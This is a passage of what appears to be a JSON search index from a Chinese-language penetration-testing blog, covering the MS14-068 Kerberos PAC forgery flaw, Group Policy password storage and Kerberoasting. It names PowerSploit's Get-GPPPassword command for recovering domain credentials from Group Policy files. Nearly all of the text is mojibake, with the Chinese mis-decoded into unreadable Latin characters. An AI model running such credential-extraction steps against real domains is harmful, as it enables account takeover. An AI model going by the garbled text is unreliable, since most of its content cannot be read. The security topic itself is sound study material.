è¿›è¡Œæ¯”å¯¹ï¼Œç„¶åå†³å®šç»™äºˆ Client ä»€ä¹ˆæ ·çš„èµ„æºè®¿é—®æƒé™ã€‚ å¾®è½¯ä½¿ç”¨ PAC æ¥è¡¨ç¤º TGS ä¸­ Client ç”³æ˜çš„åŸŸç»„ã€‚PAC (Privilege Attribute Certificate)ï¼Œç‰¹æƒå±æ€§è¯ä¹¦ã€‚ ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 PAC PAC åŒ…å« Client çš„ User çš„ SIDã€Group çš„ SIDã€‚PAC å†³å®šäº† Client çš„ç»„å±æ€§ï¼Œå³å†³å®šäº† Client çš„æƒé™ PAC ä¸ºäº†ä¿è¯è‡ªèº«çš„åˆæ³•æ€§ï¼Œè¿˜åŒ…å« 2 ä¸ªç­¾åï¼ŒKey ä¸º krbtgt çš„ NTLMï¼Œç­¾åçš„å†…å®¹é™¤äº† User SIDã€Group SID å¤–ï¼Œè¿˜æœ‰å…¶ä»–éƒ¨åˆ† PAC ä½œä¸º TGT çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯åŠ å¯†çš„ï¼Œå¯†é’¥ä¸º krbtgt çš„ NTLM Client å‘ KDC çš„ AS æ¨¡å—å‘èµ·è®¤è¯è¯·æ±‚ï¼ŒAS è¿”å› TGT æ—¶ï¼Œä¼šæ ¹æ® Client æ‰€åœ¨çš„ç»„ï¼Œç”Ÿæˆ PACï¼ŒåŒ…å« Client çš„ User SIDã€Group SIDï¼Œä»¥åŠç”¨äºç¡®ä¿ PAC ä¸è¢«ç¯¡æ”¹çš„ 2 ä¸ªç­¾å å°† PAC ä½œä¸º TGT çš„ä¸€éƒ¨åˆ†ï¼Œå‘é€ç»™ Clientã€‚ Client ä½¿ç”¨ TGT å‘ KDC çš„ TGS æ¨¡å—å‘èµ·è®¿é—® Server æœåŠ¡æ—¶ï¼ŒKDC çš„ TGS æ¨¡å—é¦–å…ˆè§£å¯†TGTï¼Œå¹¶é€šè¿‡æ ¡éªŒ 2 ä¸ªç­¾åï¼Œä»¥éªŒè¯ PAC çš„åˆæ³•æ€§ã€‚ å¦‚æœé€šè¿‡éªŒè¯ï¼ŒKDC çš„ TGS æ¨¡å—ç”¨ 2 ä¸ªæ–°çš„ç­¾åæ›¿ä»£è€çš„ç­¾åæ¥ä¿è¯ PAC ä¸è¢«ç¯¡æ”¹ã€‚ç¬¬ä¸€ä¸ªç­¾åçš„å¯†é’¥ä¸º Server çš„ NTLMï¼Œç¬¬äºŒä¸ªå¯†é’¥ä¸º Server ä¸ Client çš„ä¸´æ—¶ä¼šè¯å¯†é’¥ï¼ˆServer Session Keyï¼‰ã€‚ é‡æ–°ç­¾ååçš„ PAC è¢«æ”¾ç½®åœ¨ç­¾å‘çš„è®¿é—®ç¥¨æ® TGS ä¸­ï¼Œä½¿ç”¨ Server çš„ NTLM ä½œä¸ºå¯†é’¥è¢«åŠ å¯†ä¿æŠ¤ Server æ”¶åˆ°æ¥è‡ª Client çš„ TGS åï¼Œè§£å¯† TGS éªŒè¯åˆæ³•æ€§ï¼Œæ ¡éªŒ PAC ä¸­çš„ 2 ä¸ªç­¾åï¼Œç¡®è®¤ PAC çš„åˆæ³•æ€§ï¼Œç„¶åç¡®è®¤ Client çš„è®¿é—®æƒé™ã€‚ ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 æ¼æ´æˆå›  Client åœ¨å‘èµ·è®¤è¯è¯·æ±‚æ—¶ï¼Œé€šè¿‡è®¾ç½® include-PAC ä¸º Falseï¼Œåˆ™è¿”å›çš„ TGT ä¸­ä¸ä¼šåŒ…å« PACã€‚ KDC å¯¹ PAC è¿›è¡ŒéªŒè¯æ—¶ï¼Œå¯¹äº PAC å°¾éƒ¨çš„ç­¾åç®—æ³•ï¼Œè™½ç„¶åŸç†ä¸Šè§„å®šå¿…é¡»æ˜¯å¸¦æœ‰ Key çš„ç­¾åç®—æ³•æ‰å¯ä»¥ï¼Œä½†å¾®è½¯åœ¨å®ç°ä¸Šï¼Œå´å…è®¸ä»»æ„ç­¾åç®—æ³•ï¼Œåªè¦å®¢æˆ·ç«¯æŒ‡å®šä»»æ„ç­¾åç®—æ³•ï¼ŒKDC æœåŠ¡å™¨å°±ä¼šä½¿ç”¨æŒ‡å®šçš„ç®—æ³•è¿›è¡Œç­¾åéªŒè¯ã€‚ å› æ­¤ä¼ªé€ çš„ä»»æ„å†…å®¹éƒ½å¯ä»¥æ˜¯åˆæ³•çš„ï¼Œç›´æ¥åŠ ä¸Šå†…å®¹çš„å€¼ä½œä¸ºç­¾åå³å¯(ç¬¬ä¸€ä¸ªåŸå› ) PAC æ²¡æœ‰è¢«æ”¾åœ¨ TGT ä¸­ï¼Œæ”¾åœ¨å…¶å®ƒåœ°æ–¹ã€‚KDC åœ¨ä»ç„¶èƒ½å¤Ÿæ­£ç¡®è§£æå‡ºæ²¡æœ‰æ”¾åœ¨ TGT ä¸­çš„ PAC ä¿¡æ¯ PAC å¿…é¡»æ˜¯å¯†æ–‡ï¼Œç»è¿‡ Key åŠ å¯†çš„ KDC ä¼šä» Authenticator ä¸­å–å‡ºæ¥ Session Keyï¼ŒæŠŠ PAC ä¿¡æ¯è§£å¯†å¹¶åˆ©ç”¨å®¢æˆ·ç«¯è®¾å®šçš„ç­¾åç®—æ³•éªŒè¯ç­¾å(ç¬¬äºŒä¸ªåŸå› ) KDC éªŒè¯ç¼ºå°‘ PAC çš„ TGT æˆåŠŸåï¼Œå†å»éªŒè¯ä¸åœ¨ TGT ä¸­çš„ PAC çš„åˆæ³•æ€§ã€‚ å¦‚æœ 2 ä¸ªå‡éªŒè¯æˆåŠŸï¼ŒKDC æŠŠ PAC ä¸­çš„ User SIDã€Group SID å–å‡ºæ¥ï¼Œé‡æ–°ä½¿ç”¨è¿›è¡Œç­¾åï¼Œç­¾åç®—æ³•å’Œå¯†é’¥ä¸è®¾ç½® inclue-pac æ ‡å¿—ä½ä¸º TRUE æ—¶ä¸€æ¨¡ä¸€æ ·ã€‚å°†æ–°äº§ç”Ÿçš„ PAC åŠ å…¥åˆ°è§£å¯†åçš„ TGT ä¸­ï¼Œå†é‡æ–°åŠ å¯†åˆ¶ä½œå…¨æ–°çš„ TGT å‘é€ç»™ Clientï¼Œä¸æ˜¯ ST (ç¬¬ä¸‰ä¸ªåŸå› ) ","date":"2019-05-03","objectID":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"MS14-068 æ¼æ´åˆ†æ","uri":"/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•ç›¸å…³çŸ¥è¯†æ•´ç†","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯• ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 ç»„ç­–ç•¥çš„éƒ¨ç½²ä¸æ›´æ–° ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.1 ç»„ç­–ç•¥çš„éƒ¨ç½² Windows 2016 è‡ªå¸¦ Server Manager ç»„ç­–ç•¥ç®¡ç†å·¥å…· æ›´ä¸“ä¸šçš„ç»„ç­–ç•¥ç®¡ç†å·¥å…· GPMCï¼Œå¯ä»¥ç®¡ç†å¤šä¸ªåŸŸ åˆ›å»ºå¹¶ç¼–è¾‘ç»„ç­–ç•¥çš„å†…å®¹ ç»„ç­–ç•¥åˆ†ä½œä¸»æœºç­–ç•¥å’Œç”¨æˆ·ç­–ç•¥ï¼Œmachine å’Œ users ç›®å½•ï¼›è„šæœ¬ç±»å‹å’Œéè„šæœ¬ç±»å‹ï¼Œscript ç›®å½• ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.2 ç»„ç­–ç•¥çš„å­˜å‚¨ å­˜å‚¨åœ¨åŸŸæœåŠ¡å™¨ä¸­ï¼Œ\\\\domain\\sysvol\\policies ä»¥æ˜æ–‡å½¢å¼å­˜å‚¨ä¸º xmlã€iniã€inf ç­‰æ–‡ä»¶ å¯¹åŸŸå†…æ‰€æœ‰ç”¨æˆ·å¼€æ”¾è¯»æƒé™ ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.3 ç»„ç­–ç•¥çš„æ›´æ–° å®¢æˆ·ç«¯æ¯ 90 åˆ†é’Ÿä¸»åŠ¨è·å–ä¸€æ¬¡ç»„ç­–ç•¥ï¼Œæ£€æŸ¥ç»„ç­–ç•¥æ˜¯å¦å‘ç”Ÿå˜æ›´ å®¢æˆ·ç«¯ä½¿ç”¨ gpupdate /force å¼ºåˆ¶ç«‹å³æ£€æŸ¥ç»„ç­–ç•¥ å‚æ•°å¯ä»¥åˆ†ä¸ºä¸»æœºå’Œç”¨æˆ·ï¼Œ gpupdate /force /target:computer ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1.4 ç»„ç­–ç•¥çš„ä¸‹å‘ä¸è·å– kerberos åè®®è®¤è¯ LDAP åè®®æ£€ç´¢ SMB åè®®ä¸‹è½½ ç»„ç­–ç•¥çš„æŸ¥è¯¢åŸç† LDAP æ£€ç´¢æ‰€æœ‰çš„ç»„ç­–ç•¥ï¼Œå“ªäº›å±äºè‡ªå·±çš„æŸ¥è¯¢ç­–ç•¥ï¼ŒæœåŠ¡å™¨å†³å®šéœ€è¦è¿”å›å“ªäº›ç­–ç•¥(ç‰ˆæœ¬å·æ˜¯å†³å®šçš„é‡è¦å› ç´ ) ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 ç»„ç­–ç•¥å¯†é’¥æ”»é˜² ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.1 ç»„ç­–ç•¥ä¸­çš„å£ä»¤æ˜æ–‡ é€šè¿‡ VB è„šæœ¬éƒ¨ç½²ç™»å½•è„šæœ¬ åœ¨ 2003 ä¹‹å‰è¾ƒä¸ºå¸¸è§ï¼Œç°å·²åºŸå¼ƒã€‚ ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 ç»„ç­–ç•¥ä¸­çš„å£ä»¤å¯†æ–‡ å¾®è½¯åœ¨ windows 2008 ä¸­å‘å¸ƒäº†GPPï¼ˆGroup Policy Preferencesï¼‰ï¼ŒKB943729ï¼Œåœ¨ windows 2016 ä¸Šå·²ç¦ç”¨ã€‚ åœ¨æŸäº›åœºæ™¯å­˜å‚¨ä½¿ç”¨å‡­æ®ï¼š æ˜ å°„é©±åŠ¨(Drivers.xml) åˆ›å»º/æ›´æ–°æœåŠ¡(Services.xml) åˆ›å»ºæœ¬åœ°ç”¨æˆ· è®¡åˆ’æœåŠ¡(ScheduledTasks.xml) æ•°æ®æº(DataSources.xml) æ›´æ”¹æœ¬åœ°Administratorå¯†ç  æ‰“å°æœºé…ç½®(Printers.xml) ä»¥ä½¿ç”¨ç»„ç­–ç•¥åˆ›å»ºæœ¬åœ°ç”¨æˆ·ä¸ºä¾‹ï¼š win 2003 win 2008 ç»„ç­–ç•¥å†…å®¹ï¼š æ˜æ–‡å¯†ç ç”± AES åŠ å¯†ï¼Œä½†æ˜¯å¯†é’¥å›ºå®šï¼š ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 ç ´è§£å£ä»¤å¯†æ–‡ åˆ©ç”¨ PowerSploit ä¸­çš„ Get-GPPPassword è·å–ç»„ç­–ç•¥ä¸­çš„å£ä»¤ï¼š Get-GPPPassword ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 åˆ©ç”¨ç»„ç­–ç•¥æ”»å‡»å®¢æˆ·ç«¯ å‘å®¢æˆ·ç«¯ä¸‹å‘ç»„ç­–ç•¥ï¼š ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥å®‰å…¨æµ‹è¯•","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Kerberoasting æ”»å‡»åŸç†åŠå®éªŒ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Kerberoasting æ”»å‡» ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"1 èƒŒæ™¯ Kerberoasting æ”»å‡»æ˜¯ Tim Medin åœ¨ DerbyCon 2014 ä¸Šå‘å¸ƒçš„ä¸€ç§åŸŸå£ä»¤æ”»å‡»æ–¹æ³•ï¼ŒTim Medin åŒæ—¶å‘å¸ƒäº†é…å¥—çš„æ”»å‡»å·¥å…· kerberoastã€‚æ­¤åï¼Œä¸å°‘ç ”ç©¶äººå‘˜å¯¹ Kerberoasting è¿›è¡Œäº†æ”¹è¿›å’Œæ‰©å±•ï¼Œåœ¨ GitHub ä¸Šå¼€å‘å‘å¸ƒäº†å¤§é‡å·¥å…·ï¼Œä½¿å¾— Kerberoasting é€æ¸å‘å±•æˆä¸ºåŸŸæ”»å‡»çš„å¸¸ç”¨æ–¹æ³•ä¹‹ä¸€ã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2 åŸç† kerberos åè®®çš„è®¤è¯æˆæƒè¿‡ç¨‹ï¼Œ3 æ¬¡æ¶‰åŠä½¿ç”¨ä¸åŒè´¦æˆ·çš„ NTLM ä½œä¸ºå¯†é’¥åŠ å¯†æ•°æ® ä½¿ç”¨åŸŸç”¨æˆ·çš„ NTLM åŠ å¯†è®¤è¯è¯·æ±‚ç¥¨æ® KDC ä½¿ç”¨ Krbtgt è´¦å·çš„ NTLM åŠ å¯†è®¤è¯åçš„ç¥¨æ® TGT KDC ä½¿ç”¨è¿è¡ŒæœåŠ¡çš„æœåŠ¡è´¦å·çš„ NTLM åŠ å¯†æˆæƒç¥¨æ® TGS Kerberos ä½¿ç”¨å…¬å¼€çš„å¯¹ç§°åŠ å¯†ç®—æ³• y = f(x, key) ä¸ºå·²çŸ¥çš„å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå¦‚ rc4_hmac_nt ç­‰ã€‚ x ä¸ºå¾…åŠ å¯†çš„æ•°æ®ï¼ŒåŒ…å«æ—¶é—´æˆ³ï¼Œå…¶å®ƒä¸ºå›ºå®šæ ¼å¼çš„å†…å®¹ï¼› key ä¸ºåŠ å¯†å¯†é’¥ï¼Œå³ NTLM; y ä¸ºåŠ å¯†åçš„å¯†æ•°æ®ã€‚ å¦‚æœèƒ½ä» Kerberos åŸŸç½‘ç»œä¸­è·å– yï¼Œåˆ™æ ¹æ®å·²çŸ¥ç®—æ³•ï¼Œä½¿ç”¨ä¸åŒçš„ f å¯æ¨ç®—å‡ºä¸åŒçš„ xã€‚ ç”±äº x ä¸­åŒ…å«ç®€å•æ˜“è¾¨çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥é€šè¿‡æ—¶é—´æˆ³å¯å¿«é€Ÿåˆ¤å®šæ•°æ®è§£å¯†æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œåˆ¤å®šä½¿ç”¨çš„ key æ˜¯å¦ä¸ºè¦å¯»æ‰¾çš„å£ä»¤ã€‚ key è¶Šç®€å•ã€åŠ å¯†ç®—æ³• f å¼ºåº¦è¶Šä½ï¼Œè¢«ç ´è§£çš„æ¦‚ç‡è¶Šå¤§ï¼Œå› æ­¤éœ€è¦å¯»æ‰¾å…·æœ‰ç®€å• key çš„è´¦å·ï¼Œä»¥åŠä½¿ç”¨è¾ƒä½å¼ºåº¦çš„åŠ å¯†ç®—æ³• fã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3 è´¦å·ç±»å‹ åœ¨åŸŸå†…ä¸»è¦æœ‰ä¸»æœºè´¦å·ã€ç”¨æˆ·è´¦å·ã€æœåŠ¡è´¦å·(SPN æ³¨å†Œåœ¨åŸŸç”¨æˆ·è´¦å·ä¸‹) ç­‰ 3 ç§ä¸»è¦è´¦å·ç±»å‹ ä¸»æœºè´¦å·çš„å£ä»¤ç”±ç³»ç»Ÿéšæœºè®¾ç½®ï¼Œå‡ ä¹ä¸èƒ½ç ´è§£ï¼Œè€Œä¸”æ¯ 30 å¤©è‡ªåŠ¨å˜æ›´ä¸€æ¬¡ ç”¨æˆ·è´¦å·çš„å£ä»¤å¤æ‚åº¦ç”±ç­–ç•¥è€Œå®šï¼Œåœ¨å¤æ‚åº¦è¦æ±‚è¾ƒé«˜çš„åŸŸå†…ï¼Œç ´è§£éš¾åº¦è¾ƒå¤§ã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"3.1 æœåŠ¡è´¦å·çš„å£ä»¤å­˜åœ¨å¾ˆå¤§çš„ç‰¹æ®Šæ€§ å£ä»¤åœ¨åº”ç”¨è½¯ä»¶å®‰è£…æ—¶å¾€å¾€è‡ªåŠ¨è®¾å®šï¼Œå¤æ‚åº¦å¾€å¾€è¾ƒä¸ºç®€å• å£ä»¤å‡ ä¹ä¸ä¼šæ›´æ”¹ï¼Œå› ä¸ºå¤§éƒ¨åˆ†åº”ç”¨è½¯ä»¶æ²¡æœ‰æä¾›ä¿®æ”¹æœåŠ¡è´¦å·çš„åŠŸèƒ½å’Œæ¥å£ï¼Œä¾‹å¦‚è¿è¡Œ MS SQL Server æœåŠ¡çš„ sqlsvc è´¦å·ç­‰ æœåŠ¡è´¦å·åŸºæœ¬æ»¡è¶³å£ä»¤å¤æ‚åº¦è¾ƒä½è¿™ä¸ªæ¡ä»¶ï¼Œå¯ä»¥ä½œä¸ºç ´è§£çš„å¯¹è±¡ è¦æƒ³è¾¾æˆç ´è§£æ¡ä»¶ï¼Œè¿˜éœ€è¦è·å–åŠ å¯†åçš„æ•°æ®ï¼Œåˆ™éœ€è·å–æœåŠ¡è´¦å·çš„å¯†æ•°æ® ç”±äº TGS ç”±æœåŠ¡è´¦å·çš„ NTLM åŠ å¯†ï¼Œå› æ­¤è·å–è®¿é—®æœåŠ¡çš„ TGS å³å¯è·å–å¯†æ•°æ®ï¼Œå³ Kerberos åè®®ä¸­çš„ç¬¬ 4 æ­¥ã€‚ æ ¹æ® Kerberos åè®®ï¼Œä»»ä½•ç”¨æˆ·å‡å¯ä»¥å‘åŸŸæœåŠ¡å™¨ç”³è¯·è®¿é—®æŸä¸ªæœåŠ¡ æœåŠ¡å¯ä»¥ä¸åœ¨çº¿ï¼Œåªè¦è¯¥æœåŠ¡åœ¨åŸŸä¸­æ³¨å†Œäº† SPN(Service Principal Name) å³å¯ã€‚ ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 SPN ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"Kerberoasting æ”»å‡»","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.1 SPN ç›¸å…³æ¦‚å¿µ SPN æ˜¯æœåŠ¡å™¨ä¸Šæ‰€è¿è¡ŒæœåŠ¡çš„å”¯ä¸€æ ‡è¯†ï¼Œæ¯ä¸ªä½¿ç”¨ Kerberos çš„æœåŠ¡éƒ½éœ€è¦ä¸€ä¸ª SPN SPN åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ³¨å†Œåœ¨ AD ä¸Šæœºå™¨å¸æˆ·(Computers)ä¸‹ï¼Œå¦ä¸€ç§æ³¨å†Œåœ¨åŸŸç”¨æˆ·å¸æˆ·(Users)ä¸‹ å½“ä¸€ä¸ªæœåŠ¡çš„æƒé™ä¸º Local System æˆ– Network 